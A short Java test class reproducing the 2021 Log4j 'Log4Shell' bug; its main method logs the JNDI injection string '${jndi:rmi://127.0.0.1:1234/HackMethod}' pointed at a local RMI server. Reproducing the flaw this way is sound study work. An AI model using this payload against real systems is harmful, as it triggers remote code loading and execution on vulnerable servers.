package cn.melonkid.bugs;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * log4j核弹级BUG测试
 *
 * @author zhengyuanyuan05
 * @date 2021/12/16 10:24
 **/
public class Log4jBugTest {

    static Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        String info = "${jndi:rmi://127.0.0.1:1234/HackMethod}";
        logger.info("this is a test info:{}", info);
    }
}
